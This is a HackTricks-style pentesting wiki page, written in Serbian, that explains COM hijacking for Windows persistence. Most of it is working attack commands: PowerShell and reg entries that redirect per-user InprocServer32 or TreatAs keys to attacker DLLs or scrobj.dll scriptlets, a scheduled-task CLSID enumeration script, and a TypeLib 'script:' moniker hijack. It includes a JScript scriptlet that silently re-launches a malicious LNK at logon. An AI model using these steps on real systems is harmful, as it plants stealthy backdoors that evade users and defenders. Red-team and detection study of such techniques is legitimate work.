# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Pretraga nepostojećih COM komponenti

Pošto korisnici mogu da menjaju vrednosti u HKCU, **COM Hijacking** može da se koristi kao **mehanizam perzistencije**. Korišćenjem alata `procmon` lako je pronaći COM registry ključeve koji još ne postoje, a koje bi attacker mogao da kreira. Klasični filteri:

- Operacije **RegOpenKey**.
- gde je _Result_ **NAME NOT FOUND**.
- i gde se _Path_ završava sa **InprocServer32**.

Korisne varijacije tokom hunting-a:

- Takođe tražite nedostajuće **`LocalServer32`** ključeve. Neke COM klase su out-of-process serveri i pokrenuće EXE pod kontrolom attackera umesto DLL-a.
- Pored `InprocServer32`, pretražujte registry operacije **`TreatAs`** i **`ScriptletURL`**. Noviji detection sadržaji i malware writeup-ovi često ih posebno navode zato što su mnogo ređi od uobičajenih COM registracija i zato predstavljaju high-signal indikatore.
- Kopirajte legitimni **`ThreadingModel`** iz originalnog `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` kada klonirate registraciju u HKCU. Korišćenje pogrešnog modela često prekida aktivaciju i čini hijack uočljivijim.<sup>[[3]](#references)</sup>
- Na 64-bitnim sistemima proverite i 64-bitne i 32-bitne prikaze (`procmon.exe` naspram `procmon64.exe`, `HKLM\Software\Classes` i `HKLM\Software\Classes\WOW6432Node`), jer 32-bitne aplikacije mogu da razreše drugačiju COM registraciju.

Kada odlučite koji nepostojeći COM želite da impersonirate, izvršite sledeće komande. _Budite oprezni ako odlučite da impersonirate COM koji se učitava svakih nekoliko sekundi, jer to može biti preterano._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### COM komponente Task Scheduler-a podložne hijack-ovanju

Windows Tasks koriste Custom Triggers za pozivanje COM objekata i, pošto se izvršavaju kroz Task Scheduler, lakše je predvideti kada će biti aktivirani.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Proverom izlaza možete izabrati onaj koji će se izvršavati **svaki put kada se korisnik prijavi** na primer.

Zatim pretražite CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** u **HKEY\CLASSES\ROOT\CLSID**, kao i u HKLM i HKCU. Obično ćete pronaći da vrednost ne postoji u HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Zatim možete samo da kreirate HKCU unos i svaki put kada se korisnik prijavi, vaš backdoor će biti pokrenut.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` omogućava da jedan CLSID emulira drugi.<sup>[[4]](#references)</sup> Iz ofanzivne perspektive, to znači da možete ostaviti originalni CLSID netaknutim, kreirati drugi CLSID po korisniku koji pokazuje na `scrobj.dll`, a zatim preusmeriti pravi COM objekat na zlonamerni pomoću `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Ovo je korisno kada:

- ciljna aplikacija već instancira stabilan CLSID prilikom prijavljivanja ili pokretanja aplikacije
- želite preusmeravanje koje koristi samo registry, umesto zamene originalnog `InprocServer32`
- želite da izvršite lokalni ili udaljeni `.sct` scriptlet kroz vrednost `ScriptletURL`

Primer toka rada (prilagođen javno dostupnom Atomic Red Team tradecraft-u i starijim istraživanjima zloupotrebe COM registry-ja):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Napomene:

- `scrobj.dll` čita vrednost `ScriptletURL` i izvršava navedeni `.sct`, tako da payload možete zadržati kao lokalnu datoteku ili ga preuzeti udaljeno preko HTTP/HTTPS.
- `TreatAs` je naročito koristan kada je originalna COM registracija potpuna i stabilna u HKLM, jer vam je potreban samo mali redirect po korisniku umesto preslikavanja celog stabla.
- Za validaciju bez čekanja na prirodni trigger, možete ručno instancirati lažni ProgID/CLSID pomoću `rundll32.exe -sta <ProgID-or-CLSID>` ako ciljana klasa podržava STA aktivaciju.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definišu COM interfejse i učitavaju se preko `LoadTypeLib()`. Kada se COM server instancira, OS može učitati i povezani TypeLib proverom registry ključeva pod `HKCR\TypeLib\{LIBID}`. Ako se putanja TypeLib-a zameni **monikerom**, npr. `script:C:\...\evil.sct`, Windows će izvršiti scriptlet kada se TypeLib razreši – čime se dobija prikrivena persistence koja se aktivira kada se koriste uobičajene komponente.

Ovo je primećeno kod Microsoft Web Browser kontrole (koju često učitavaju Internet Explorer, aplikacije koje ugrađuju WebBrowser, pa čak i `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Koraci (PowerShell)

1) Identifikujte TypeLib (LIBID) koji koristi CLSID sa visokom učestalošću. Primer CLSID-a koji malware lanci često zloupotrebljavaju: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Usmerite TypeLib putanju za korisnika na lokalni scriptlet koristeći `script:` moniker (nisu potrebna administratorska prava):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Postavite minimalni JScript `.sct` koji ponovo pokreće vaš primarni payload (npr. `.lnk` koji koristi početni lanac):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Pokretanje – otvaranje IE-a, aplikacije koja ugrađuje WebBrowser kontrolu ili čak uobičajena aktivnost u Explorer-u učitaće TypeLib i izvršiti scriptlet, ponovo aktivirajući vaš lanac pri logon/reboot.

Čišćenje
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Napomene
- Istu logiku možete primeniti na druge COM komponente visoke učestalosti; uvek prvo razrešite stvarni `LIBID` iz `HKCR\CLSID\{CLSID}\TypeLib`.
- Na 64-bitnim sistemima možete popuniti i podključ `win64` za 64-bitne korisnike.

## Reference

- [1] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
